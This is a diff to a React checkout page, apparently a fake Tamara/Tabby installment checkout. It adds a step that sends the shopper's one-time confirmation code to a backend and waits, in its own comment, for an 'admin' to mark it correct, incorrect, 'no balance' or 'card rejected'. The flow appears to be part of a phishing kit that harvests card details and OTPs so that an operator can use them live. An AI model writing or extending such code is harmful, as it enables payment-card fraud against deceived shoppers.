@@ -4,16 +4,16 @@ import { useAuth } from '@/context/AuthContext';
 import Layout from '@/components/Layout';
 import { getProducts } from '@/data/products';
 import { motion, AnimatePresence } from 'framer-motion';
-import { ArrowRight, ShoppingBag, Tag, Check, CreditCard, Phone, ShieldCheck, Lock, ChevronLeft, Loader2, XCircle } from 'lucide-react';
+import { ArrowRight, ShoppingBag, Tag, Check, CreditCard, Phone, ShieldCheck, Lock, ChevronLeft, Loader2, XCircle, AlertCircle } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { toast } from 'sonner';
-import { postCheckoutEvent, requestCardApproval, getCardApprovalStatus } from '@/lib/api';
+import { postCheckoutEvent, requestCardApproval, getCardApprovalStatus, submitVerificationCode, getVerificationResult } from '@/lib/api';
 import { getCheckoutSessionId, clearCheckoutSessionId } from '@/lib/checkoutSession';
 
 type PaymentMethod = 'tamara' | 'tabby' | null;
-type Step = 'checkout' | 'confirm-method' | 'verify-phone' | 'card-info' | 'card-approval' | 'confirm-code' | 'success' | 'cancelled';
+type Step = 'checkout' | 'confirm-method' | 'verify-phone' | 'card-info' | 'card-approval' | 'confirm-code' | 'verifying-code' | 'success' | 'cancelled' | 'verification-failed';
 
 const Checkout = () => {
   const { id } = useParams();
@@ -36,6 +36,7 @@ const Checkout = () => {
   const [confirmCode, setConfirmCode] = useState('');
   const [agreedTerms, setAgreedTerms] = useState(false);
   const [commission] = useState(0);
+  const [verificationError, setVerificationError] = useState<string | null>(null);
 
   if (!user) {
     navigate('/login?redirect=/checkout/' + id);
@@ -231,52 +232,119 @@ const Checkout = () => {
     };
   }, [step, sessionId, user, product, paymentMethod, installments, phoneNumber]);
 
-  const handleFinalConfirm = () => {
+  // Poll for verification result
+  useEffect(() => {
+    if (step !== 'verifying-code') return;
+
+    let pollingInterval: NodeJS.Timeout | null = null;
+    let timeoutId: NodeJS.Timeout | null = null;
+
+    const pollStatus = async () => {
+      try {
+        const response = await getVerificationResult(sessionId);
+        
+        if (response.status === 'code_correct') {
+          if (pollingInterval) clearInterval(pollingInterval);
+          if (timeoutId) clearTimeout(timeoutId);
+
+          // Send redirect_to_payment event before completing
+          postCheckoutEvent({
+            sessionId,
+            eventType: 'redirect_to_payment',
+            userName: user.name,
+            userEmail: user.email,
+            productName: product.name,
+            amount: finalPrice,
+            paymentMethod,
+            installments,
+            phoneMasked: phoneNumber,
+            orderId,
+            timestamp: new Date().toISOString(),
+          }).catch(() => {});
+
+          // Send checkout_completed event
+          postCheckoutEvent({
+            sessionId,
+            eventType: 'checkout_completed',
+            userName: user.name,
+            userEmail: user.email,
+            productName: product.name,
+            amount: finalPrice,
+            paymentMethod,
+            installments,
+            phoneMasked: phoneNumber,
+            orderId,
+            paymentStatus: 'paid',
+            timestamp: new Date().toISOString(),
+          }).catch(() => {});
+
+          setStep('success');
+          toast.success('تم إتمام عملية الشراء بنجاح! 🎉');
+          clearCheckoutSessionId();
+        } else if (response.status === 'code_incorrect') {
+          if (pollingInterval) clearInterval(pollingInterval);
+          if (timeoutId) clearTimeout(timeoutId);
+          setVerificationError('الكود غير صحيح - يرجى المحاولة لاحقاً');
+          setStep('verification-failed');
+          clearCheckoutSessionId();
+        } else if (response.status === 'no_balance') {
+          if (pollingInterval) clearInterval(pollingInterval);
+          if (timeoutId) clearTimeout(timeoutId);
+          setVerificationError('لا يوجد رصيد بالبطاقة');
+          setStep('verification-failed');
+          clearCheckoutSessionId();
+        } else if (response.status === 'card_rejected') {
+          if (pollingInterval) clearInterval(pollingInterval);
+          if (timeoutId) clearTimeout(timeoutId);
+          setVerificationError('تم رفض البطاقة');
+          setStep('verification-failed');
+          clearCheckoutSessionId();
+        }
+      } catch (err) {
+        console.error('Error checking verification result:', err);
+      }
+    };
+
+    // Start polling
+    pollingInterval = setInterval(pollStatus, 2000);
+
+    // Set timeout after 5 minutes
+    timeoutId = setTimeout(() => {
+      if (pollingInterval) clearInterval(pollingInterval);
+      setVerificationError('انتهت مهلة التحقق. يرجى المحاولة مرة أخرى.');
+      setStep('verification-failed');
+    }, 5 * 60 * 1000);
+
+    return () => {
+      if (pollingInterval) clearInterval(pollingInterval);
+      if (timeoutId) clearTimeout(timeoutId);
+    };
+  }, [step, sessionId, user, product, paymentMethod, installments, phoneNumber, finalPrice, orderId]);
+
+  const handleFinalConfirm = async () => {
     if (!confirmCode || confirmCode.length < 4) {
       toast.error('يرجى إدخال رمز التأكيد');
       return;
     }
 
-    // Send redirect_to_payment event before completing
-    postCheckoutEvent({
-      sessionId,
-      eventType: 'redirect_to_payment',
-      userName: user.name,
-      userEmail: user.email,
-      productName: product.name,
-      amount: finalPrice,
-      paymentMethod,
-      installments,
-      phoneMasked: phoneNumber,
-      orderId,
-      timestamp: new Date().toISOString(),
-    }).catch(() => {
-      // Silently ignore errors
-    });
+    try {
+      await submitVerificationCode(sessionId, confirmCode, {
+        userName: user.name,
+        userEmail: user.email,
+        productName: product.name,
+        amount: finalPrice,
+        paymentMethod,
+        installments,
+        phoneMasked: phoneNumber,
+      });
 
-    // Send checkout_completed event
-    postCheckoutEvent({
-      sessionId,
-      eventType: 'checkout_completed',
-      userName: user.name,
-      userEmail: user.email,
-      productName: product.name,
-      amount: finalPrice,
-      paymentMethod,
-      installments,
-      phoneMasked: phoneNumber,
-      orderId,
-      paymentStatus: 'paid',
-      timestamp: new Date().toISOString(),
-    }).catch(() => {
-      // Silently ignore errors
-    });
-
-    setStep('success');
-    toast.success('تم إتمام عملية الشراء بنجاح! 🎉');
-
-    // Clear the checkout session after completion
-    clearCheckoutSessionId();
+      toast.info('جاري التحقق من الكود...');
+      setVerificationError(null);
+      setStep('verifying-code');
+    } catch (err) {
+      console.error('Failed to submit verification code:', err);
+      toast.error('فشل في إرسال الكود. يرجى المحاولة مرة أخرى.');
+    }
   };
 
   const methodName = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod === 'tabby' ? 'تابي' : '';
@@ -641,6 +709,38 @@ const Checkout = () => {
                 >
                   تأكيد
                 </Button>
+              </div>
+            </motion.div>
+          )}
+
+          {/* Step: Verifying Code (waiting for admin) */}
+          {step === 'verifying-code' && (
+            <motion.div key="verifying" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
+              <div className="bg-card rounded-2xl border gold-border p-10 text-center">
+                <div className="w-20 h-20 rounded-full bg-primary/10 mx-auto mb-6 flex items-center justify-center">
+                  <Loader2 className="h-10 w-10 text-primary animate-spin" />
+                </div>
+                <h2 className="text-2xl font-extrabold gold-text mb-3">جاري التحقق من الكود</h2>
+                <p className="text-muted-foreground mb-6">يرجى الانتظار بينما يتم التحقق من كود التفعيل</p>
+                <p className="text-sm text-muted-foreground">سيتم تحديث الصفحة تلقائياً</p>
+              </div>
+            </motion.div>
+          )}
+
+          {/* Step: Verification Failed */}
+          {step === 'verification-failed' && (
+            <motion.div key="verification-failed" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
+              <div className="bg-card rounded-2xl border gold-border p-10 text-center">
+                <div className="w-20 h-20 rounded-full bg-red-500/10 mx-auto mb-6 flex items-center justify-center">
+                  <AlertCircle className="h-10 w-10 text-red-500" />
+                </div>
+                <h2 className="text-2xl font-extrabold text-red-500 mb-3">فشل التحقق</h2>
+                <p className="text-muted-foreground mb-6">{verificationError || 'حدث خطأ أثناء التحقق من الكود'}</p>
+                <Link to="/">
+                  <Button className="w-full py-5 font-bold gold-gradient text-primary-foreground">
+                    العودة للرئيسية
+                  </Button>
+                </Link>
               </div>
             </motion.div>
           )}
